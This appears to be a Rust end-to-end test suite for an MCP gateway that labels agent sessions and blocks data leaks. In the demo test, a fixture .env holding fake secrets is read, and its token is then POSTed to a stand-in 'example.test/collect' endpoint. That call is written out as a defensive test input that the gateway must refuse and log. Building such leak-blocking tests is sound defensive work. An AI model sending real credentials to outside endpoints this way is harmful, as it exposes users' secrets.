// ── Naryad №805 (wave 66, P1 — the gateway G4): the demo + e2e ────────
//
// Contract (issue #1483, the C1 (b) owner decision 23.10 — the pilot's
// exit criterion): the demo scenario runs END-TO-END against the REAL
// gateway surface — the shipped `examples/gateway/policy.mlog` is the
// artifact under test (no copy drift: the test reads the example file
// and only mechanically renames the two upstream prefixes for the
// process-global grant-ledger isolation, the №801 form). The scenario:
//
//   agent reads `.env` (the file upstream, Source private) → the
//   session label joins private → the agent tries to POST the contents
//   through the fetch upstream (Sink public, trusted) → the gateway
//   refuses with [SINK_CLEARANCE] BEFORE the upstream sees the call →
//   the refusal is a SIGNED ledger record (`mcp.call.denied`) → the
//   ledger export verifies EXTERNALLY (the №393 chain contract). Plus
//   the allowed path (a fresh session may post) and the owner grant
//   (once — the next call is refused again).
//
// RED-before (форма №772): this naryad is ADDITIVE — every pin rides
// the merged G1–G3 machinery (№793 pool, №794 ledger, №801 labels).
// The one genuinely new surface is TWO upstreams pooled in ONE gateway
// process (the №793 tests pooled one per server); the two-upstream
// scenarios below pin exactly that — they ran against the pre-№805
// main first, and the result is recorded in the PR body.

#![allow(clippy::disallowed_methods)]

use metalogos_server::mcp_server::McpServer;
use std::path::PathBuf;
use std::sync::Mutex;

static ENV_LOCK: Mutex<()> = Mutex::new(());

fn lock_env() -> std::sync::MutexGuard<'static, ()> {
    ENV_LOCK.lock().unwrap_or_else(|p| p.into_inner())
}

/// The shipped demo policy with the two upstream prefixes mechanically
/// renamed (`files` → `f_<tag>`, `web` → `w_<tag>`) — the isolation form
/// of №801: the grant ledger is process-global, every scenario needs its
/// own grant scopes. The rename touches ONLY the quoted policy entries.
fn demo_policy(tag: &str) -> String {
    let manifest = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    let path = manifest
        .join("..")
        .join("examples")
        .join("gateway")
        .join("policy.mlog");
    let src = std::fs::read_to_string(&path).expect("examples/gateway/policy.mlog ships");
    src.replace("tool \"files.", &format!("tool \"f_{}.", tag))
        .replace("tool \"web.", &format!("tool \"w_{}.", tag))
}

fn fixture(name: &str) -> String {
    let manifest = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    manifest
        .join("..")
        .join("tests")
        .join("fixtures")
        .join(name)
        .to_string_lossy()
        .to_string()
}

/// The gateway with BOTH upstreams pooled in one process (the G4 shape).
fn make_gateway(tag: &str) -> McpServer {
    let spec = format!(
        "f_{}=python3,{};w_{}=python3,{}",
        tag,
        fixture("mcp_file_server.py"),
        tag,
        fixture("mcp_fetch_server.py")
    );
    std::env::set_var("METALOGOS_MCP_UPSTREAMS", &spec);
    let server = McpServer::new(
        &metalogos::parser::parse(&demo_policy(tag)).expect("the demo policy parses"),
        &[
            "owner_unlock.unlock".to_string(),
            "ledger_dump.dump".to_string(),
        ],
    )
    .expect("the gateway builds with two classified upstreams");
    std::env::remove_var("METALOGOS_MCP_UPSTREAMS");
    server
}

/// A per-test fixture `.env` (the harness write — the №475 justified form).
fn fixture_env(tag: &str) -> String {
    let path = std::env::temp_dir().join(format!("n805_env_{}.env", tag));
    std::fs::write(&path, "API_TOKEN=SECRET-ENV-42\nSTRIPE_KEY=sk_demo_1\n")
        .expect("write the fixture .env");
    path.to_string_lossy().to_string()
}

fn call(server: &McpServer, name: &str, args: serde_json::Value, id: i64) -> serde_json::Value {
    server.handle_request(
        "tools/call",
        &serde_json::json!({"name": name, "arguments": args}),
        &serde_json::json!(id),
    )
}

fn call_text(response: &serde_json::Value) -> String {
    response["result"]["content"][0]["text"]
        .as_str()
        .expect("text block")
        .to_string()
}

fn ledger_denied_delta() -> usize {
    metalogos::ledger::all_records()
        .expect("the in-process ledger")
        .iter()
        .filter(|r| r.action == "mcp.call.denied")
        .count()
}

// ── 1. THE demo: read .env → POST refused → signed ledger verdict ────

#[test]
fn n805_g4_demo_leak_refused_and_ledger_verified() {
    let _g = lock_env();
    std::env::set_var(
        "METALOGOS_LEDGER_KEY",
        "3f1a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f7789aabbccddeeff12",
    );
    let envfile = fixture_env("t1");
    let server = make_gateway("t1");

    // The gateway exposes the classified upstream tools + the local ones.
    let list = server.handle_request("tools/list", &serde_json::json!({}), &serde_json::json!(1));
    let names: Vec<String> = list["result"]["tools"]
        .as_array()
        .expect("tools/list result")
        .iter()
        .map(|t| t["name"].as_str().expect("tool name").to_string())
        .collect();
    for expected in [
        "f_t1.read_file",
        "w_t1.http_post",
        "owner_unlock.unlock",
        "ledger_dump.dump",
    ] {
        assert!(
            names.iter().any(|n| n == expected),
            "tools/list must carry `{}`: {:?}",
            expected,
            names
        );
    }

    // Step 1: the agent reads the .env — the call succeeds, the content
    // rides back, and the session label joins private.
    let r = call(
        &server,
        "f_t1.read_file",
        serde_json::json!({"path": envfile}),
        2,
    );
    assert_eq!(r["result"]["isError"], false, "the read must succeed: {r}");
    assert!(
        call_text(&r).contains("SECRET-ENV-42"),
        "the read returns the file content: {r}"
    );
    let meta = &r["result"]["_meta"];
    let label = meta["metalogos.dev/session-label"]
        .as_str()
        .expect("the session label must ride the result _meta");
    assert!(
        label.contains("private"),
        "the label must reflect the private join, got: {label}"
    );

    // Step 2: the agent tries to exfiltrate — the gateway refuses BEFORE
    // the upstream sees the call, with the typed, actionable error.
    let before = ledger_denied_delta();
    let r = call(
        &server,
        "w_t1.http_post",
        serde_json::json!({"url": "https://example.test/collect", "body": "API_TOKEN=SECRET-ENV-42"}),
        3,
    );
    assert_eq!(
        r["result"]["isError"], true,
        "the leak must be refused: {r}"
    );
    let text = call_text(&r);
    assert!(
        text.contains("[SINK_CLEARANCE]"),
        "the refusal carries the stable code: {text}"
    );
    assert!(
        text.contains("w_t1.http_post"),
        "the refusal names the tool: {text}"
    );
    assert!(
        text.contains("private"),
        "the refusal shows the session label: {text}"
    );

    // Step 3: the refusal is a SIGNED ledger record, and the export
    // verifies on the EXTERNAL verifier's terms (the №393 contract).
    let after = ledger_denied_delta();
    assert_eq!(
        after,
        before + 1,
        "exactly one mcp.call.denied record for the refusal"
    );
    let export = metalogos::ledger::export_jsonl().expect("the ledger export");
    let verdict = metalogos::ledger::ledger_verify(
        metalogos::ledger::LedgerVerifySource::Jsonl(&export),
        None,
        None,
    );
    assert!(
        verdict.ok,
        "the ledger chain must verify: {:?}",
        verdict.fault
    );
}

// ── 2. The allowed path: a fresh session may post ────────────────────

#[test]
fn n805_g4_demo_fresh_session_send_passes() {
    let _g = lock_env();
    let server = make_gateway("t2");

    // No Source call happened — the session sits at the bottom of the
    // lattice and the public sink is reachable (the №801 posture).
    let r = call(
        &server,
        "w_t2.http_post",
        serde_json::json!({"url": "https://example.test/api", "body": "hello"}),
        1,
    );
    assert_eq!(r["result"]["isError"], false, "the send must pass: {r}");
    assert!(
        call_text(&r).contains("posted 5 bytes to https://example.test/api"),
        "the upstream actually executed: {r}"
    );
}

// ── 3. The owner grant unblocks EXACTLY once ─────────────────────────

#[test]
fn n805_g4_demo_grant_unblocks_once() {
    let _g = lock_env();
    let envfile = fixture_env("t3");
    let server = make_gateway("t3");

    // Raise the label first.
    let r = call(
        &server,
        "f_t3.read_file",
        serde_json::json!({"path": envfile}),
        1,
    );
    assert_eq!(r["result"]["isError"], false, "the read must succeed: {r}");

    // The post refuses on the label.
    let r = call(
        &server,
        "w_t3.http_post",
        serde_json::json!({"url": "https://example.test/collect", "body": "x"}),
        2,
    );
    assert_eq!(r["result"]["isError"], true, "the label must refuse: {r}");

    // The owner grants ONE call.
    let r = call(
        &server,
        "owner_unlock.unlock",
        serde_json::json!({"scope": "mcp:w_t3.http_post"}),
        3,
    );
    assert_eq!(r["result"]["isError"], false, "the grant must issue: {r}");

    // The granted call passes.
    let r = call(
        &server,
        "w_t3.http_post",
        serde_json::json!({"url": "https://example.test/collect", "body": "x"}),
        4,
    );
    assert_eq!(
        r["result"]["isError"], false,
        "the once-grant unblocks the first call: {r}"
    );

    // The next one is refused again — the grant was consumed.
    let r = call(
        &server,
        "w_t3.http_post",
        serde_json::json!({"url": "https://example.test/collect", "body": "x"}),
        5,
    );
    assert_eq!(
        r["result"]["isError"], true,
        "the consumed grant must not unblock again: {r}"
    );
    assert!(
        call_text(&r).contains("[SINK_CLEARANCE]"),
        "the second refusal carries the code: {r}"
    );
}

// ── 4. The audit tap: ledger_dump round-trips the signed export ──────

#[test]
fn n805_g4_demo_ledger_dump_roundtrip() {
    let _g = lock_env();
    std::env::set_var(
        "METALOGOS_LEDGER_KEY",
        "3f1a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d5e6f7789aabbccddeeff12",
    );
    let envfile = fixture_env("t4");
    let server = make_gateway("t4");

    // Two calls with two outcomes.
    let r = call(
        &server,
        "f_t4.read_file",
        serde_json::json!({"path": envfile}),
        1,
    );
    assert_eq!(r["result"]["isError"], false, "{}", r);
    let _r = call(
        &server,
        "w_t4.http_post",
        serde_json::json!({"url": "https://example.test/collect", "body": "x"}),
        2,
    );

    // The audit tap writes the export through the MCP surface itself
    // (ledger_export is FILE EGRESS — classified Sink, audited; the tool
    // lane runs in the serve-route context, so the write is contained to
    // the data directory — METALOGOS_DATA_DIR, default ./data, №475:
    // relative `data/…` path + the harness creates/removes the dir).
    let data_dir = std::path::Path::new("data");
    let harness_dir = !data_dir.exists();
    std::fs::create_dir_all(data_dir).expect("create the harness data dir");
    let export_path = "data/n805_ledger_t4.jsonl";
    let r = call(
        &server,
        "ledger_dump.dump",
        serde_json::json!({"path": export_path}),
        3,
    );
    assert_eq!(r["result"]["isError"], false, "the dump must succeed: {r}");

    // The file IS a valid ledger export: records parse, both outcomes
    // are present, and the external verifier accepts the chain.
    let jsonl = std::fs::read_to_string(export_path).expect("the export file");
    let _ = std::fs::remove_file(export_path); // the harness cleanup
    if harness_dir {
        let _ = std::fs::remove_dir(data_dir); // only what the harness made
    }
    let records = metalogos::ledger::records_from_jsonl(&jsonl).expect("valid JSONL export");
    assert!(
        records.iter().any(|rec| rec.action == "mcp.call"),
        "an allowed call is recorded"
    );
    assert!(
        records.iter().any(|rec| rec.action == "mcp.call.denied"),
        "the refused call is recorded"
    );
    let verdict = metalogos::ledger::ledger_verify(
        metalogos::ledger::LedgerVerifySource::Jsonl(&jsonl),
        None,
        None,
    );
    assert!(
        verdict.ok,
        "the dumped chain must verify: {:?}",
        verdict.fault
    );
}
